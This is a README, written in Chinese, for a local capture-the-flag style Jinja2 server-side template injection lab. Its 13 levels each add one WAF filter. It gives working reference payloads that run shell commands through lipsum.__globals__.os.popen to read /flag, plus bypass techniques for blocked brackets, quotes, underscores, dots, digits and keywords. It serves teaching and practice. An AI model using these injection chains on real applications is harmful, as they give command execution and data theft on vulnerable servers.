# 02 · Jinja2 13 关 WAF 链

| | |
|---|---|
| 端口 | `8092`（`JINJA_CHAIN_PORT` 可改） |
| 引擎 | Jinja2（Flask `render_template_string`） |
| 关卡数 | 13（id `0`–`12`） |
| 依赖网络 | 否 |
| flag | 容器内 `/flag`，由环境变量写入 |

## 这个靶场在教什么

同一个注入点，13 关，**每关只加一条过滤规则**。目的不是让你背 payload，而是让你
建立一条判断链：

1. 我的 payload 死在**哪一条规则**上？
2. 这条规则封掉的是**语法**还是**字符**？
3. 同一个语义还有没有别的**语法面**可以表达？

第 3 关（id `2`）是**盲渲染**：只回显 `correct` / `wrong`。它教你无回显条件下
如何把「拿到数据」转换成「控制成功与否」——这是后面 `06-blind-ssti` 和
`07-flask-memshell` 的前置技能。

## 关卡表

| id | 关卡 | 过滤内容 | 关键思路 |
|----|------|----------|----------|
| 0 | L1 无过滤 | — | `{{7*7}}`；`config` / `lipsum.__globals__` 两条链 |
| 1 | L2 拦截 `{{` | 子串 `{{` | 用语句块 `{% print(...) %}` |
| 2 | L3 盲渲染 | 无过滤，但只回显 correct/wrong | 把数据变成成功/失败信号 |
| 3 | L4 禁止方括号 | `[` `]` | `\|first` / `\|last` / `\|list` 替代下标 |
| 4 | L5 禁止引号 | `'` `"` | `request.args.x` 取字符串 |
| 5 | L6 禁止下划线 | `_` | `\|attr` 接受字符串属性名 |
| 6 | L7 禁止点号 | `.` | `\|attr` 或 `[]`（本关方括号未禁） |
| 7 | L8 关键字黑名单 | 12 个子串（大小写敏感） | 字符串拼接 + `\|attr` |
| 8 | L9 禁止数字 | `0`–`9` | `true\|int`、`\|length` 凑整数 |
| 9 | L10 前缀置空 | 载荷前拼 `{% set config=None%}{% set self=None%}` | 换未置空的全局入口 |
| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `\|join` 替代 `+`，绕过取值通道 |
| 11 | L12 强字符集 | 再加 `_`、数字、`\` | 本关没禁 `request` 与数字：属性名全从 query 带入，`dict(kw=true)\|first` 无引号造短串 |
| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | 作者挑战关（无已知解）：`attr` 在表内 ⇒ 全部属性访问原语不可用，见题面说明 |

## 参考解

下面标注「✅ 已验证」的 payload 由 `scripts/verify_labs.py` 实际跑过并断言了输出。

### L1（id 0）无过滤 ✅

```jinja2
{{7*7}}                          → 49
{{config}}                        → Flask 配置对象
{{lipsum.__globals__.os.popen('cat /flag').read()}}
```

### L2（id 1）拦截 `{{` ✅

被拦的是**模板定界符**，不是表达式：

```jinja2
{% print(7*7) %}                 → 49
{% print(lipsum.__globals__.os.popen('cat /flag').read()) %}
```

### L3（id 2）盲渲染 ✅

服务端只回 `correct` / `wrong`。要读数据就把条件接到异常上：

```jinja2
ok                                   → correct
{{ 1/0 }}                            → wrong（ZeroDivisionError）
{% if 1 == 1 %}{{ 1/0 }}{% endif %}  → wrong，可用于逐位外带
```

### L4（id 3）禁止 `[` `]` ✅

```jinja2
{{lipsum.__globals__.os.popen('cat /flag').read()}}      # 本来就不需要方括号
{{(1,2,3)|first}}                                         # 需要取元素时用过滤器
```

### L5（id 4）禁止引号 ✅

用 `request.args` 把字符串「从外部带进来」，payload 里一个引号都不出现：

```bash
curl -s -X POST 'localhost:8092/api/render?c=cat /flag' \
     -H 'Content-Type: application/json' \
     -d '{"level":"4","template":"{{lipsum.__globals__.os.popen(request.args.c).read()}}"}'
```

或用过滤器把数字转成字符串：`{{7|string}}`。被拦的样子：`{{ 'a' }}` → `WAF`。

### L6（id 5）禁止下划线

> ⚠️ 这一关最容易被写错。**`'_'~'_'` 这种写法在本关是过不去的** ——
> 本关禁的是**字符 `_` 本身**，不是子串 `__`。你的源码里只要出现一次 `_`
> 就会被拦，所以「把 `__class__` 拆成 `'_'~'_'~'class'…`」在这里没用。

两条真正可行的路（都实测过）：

**① 属性名从请求里带进来（最短）** —— payload 里一个 `_` 都不出现：

```bash
curl -s -X POST 'localhost:8092/api/render?a=__globals__&b=os&c=popen&d=cat /flag&e=read' \
     -H 'Content-Type: application/json' \
     -d '{"level":"5","template":"{{lipsum[request.args.a][request.args.b][request.args.c](request.args.d)[request.args.e]()}}"}'
```

**② 运行期造出 `_` 字符**：`'%c'|format(95)` 就是 `_`，源码里同样不出现 `_`：

```jinja2
{{lipsum|attr('%c%cglobals%c%c'|format(95,95,95,95))}}   → jinja2.utils 的 globals 字典
{{lipsum['%c%cglobals%c%c'|format(95,95,95,95)]['o'~'s']}} → <module 'os' (frozen)>
```

### L7（id 6）禁止点号 ✅

本关方括号没有被禁，**用下标替代点号**即可 —— 注意不要用 `|attr`：

```jinja2
{{lipsum['__globals__']['os']['popen']('cat /flag')['read']()}}   → flag{...}
```

> 这条链之所以必须用下标，是因为 `__globals__` 是一个 **dict**。
> Jinja 的 `.` 访问会**先试 `getattr` 再回退到 `__getitem__`**，所以
> `lipsum.__globals__.os` 能work；而 `|attr` 过滤器只做纯 `getattr`，
> 对 dict **不**回退到下标 —— `{{lipsum|attr('__globals__')|attr('os')}}`
> 会抛 `UndefinedError: 'dict object' has no attribute 'os'`。
> 这是 13 关里最容易踩的坑之一。

### L8（id 7）关键字子串黑名单 ✅

黑名单含 `attr`，所以**这一关不能用 `|attr`**；`global` 也被禁，
`__globals__` 不能原样写出来。用 `~` 拼接关键字、用下标取属性：

```jinja2
{{lipsum['__glo'~'bals__']['o'~'s']['po'~'pen']('cat /flag')['re'~'ad']()}}   → flag{...}
```

拼接后源码里不再出现 `global` / `open` 这些子串，但运行期属性名是正确的。
（`'po'~'pen'` → `popen`；`'ca'~'t'~' /flag'` 也可以用来避开别处的 `cat` 规则。）

### L9（id 8）禁止数字

不能写 `chr(47)`。整数来源：

```jinja2
{{true|int}}          → 1
{{false|int}}         → 0
{{lipsum|length}}     → 由对象长度得到整数，无需字面量
```

再用加减移位凑出 `47`（`/`）等需要的值。完整无数字通杀链较长，建议脚本生成。

### L10（id 9）前缀置空 config / self

`config` 与 `self` 被置空，但 `lipsum` / `cycler` / `joiner` / `namespace` / `request`
都还在 —— 直接换入口即可。上帝模式的 `template_after_waf` 能看到前缀确实被拼上了。

### L11（id 10）组合过滤

`+` 被禁 → 用 `|join`；`.` 被禁 → `|attr`；`[]` 被禁 → 用过滤器；
`request` 被禁 → 换其它取值通道（`session`、`config`、`url_for` 等）。

### L12（id 11）强字符集 ✅

禁 `_ . 0-9 \ ' " [ ]`。对比 L11 的黑名单找差异：**`request` 没有被禁**。
于是属性名全部从 query 带入，载荷里一个 `_`、一个引号、一个数字都不出现：

```jinja2
{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}
{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))
|attr(r(dict(d=true)|first))(r(dict(e=true)|first))|attr(r(dict(f=true)|first))()}}
```

query：`a=__globals__&b=get&c=os&d=popen&e=cat /flag&f=read`。

要点：`dict(关键字=true)|first` 在**无引号、无数字**的条件下造出短字符串
（`true` 是 Jinja 字面量，不含数字）；`r` 是绑定好的 `request.args.get`，
六个属性名/命令全部来自请求。已由 `tests/audit_solvability.py` 在容器内实测拿到 flag。

### L13（id 12）扩展关键字 —— 作者挑战关（无已知解）

在 L12 之上再禁 `request` 与若干关键字。`attr` 在子串表里 ⇒
`|attr`、`getattr`、`map(attribute=…)`、`selectattr`… 全部写不出来；
加上点号与方括号被禁，Jinja 的**全部属性访问原语**在本关不可用，
而已知的每条 gadget 链都需要至少一次属性访问。

这是刻意保留的难度上限（题面已如实标注）。练习方式：
开**上帝模式**确认 `template_after_waf`，理解「为什么每条路都断在属性访问上」。
若教学场次需要人人可过，按 `docs/SOLVABILITY.md` §2.5 的表放宽一条约束即可
（允许 `request` / 允许 `attr` 子串 / 允许 `.`，任选其一）。

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起单个靶场
cd labs/02-jinja-chain
docker compose up --build            # → http://127.0.0.1:8092

# 或在仓库根目录一次起全部
docker compose up -d
```

## 直接调 API（不依赖前端）

```bash
curl -s localhost:8092/api/lab-info | jq .levels[0]
curl -s -X POST localhost:8092/api/render \
     -H 'Content-Type: application/json' \
     -d '{"level":"1","mode":"god","template":"{% print(7*7) %}"}' | jq
```

## 上帝模式（出题人视角）

`mode=god` 会额外返回：

| 字段 | 用途 |
|------|------|
| `template_after_waf` | 过滤/拼接之后的真实模板 —— 确认规则到底怎么生效 |
| `raw_output` | 未经盲关包装的真实渲染结果 |
| `error` / `exception_type` | 区分「被 WAF 拦」与「载荷语法错」 |
| `source_class` | 触发渲染的关卡定义（便于定位代码） |

前端的 **关卡源码** 按钮会调 `/api/god/source`，直接显示那一关的
`WafSpec` 定义 —— 出题时改过滤规则、复盘时确认规则，比读文档快。
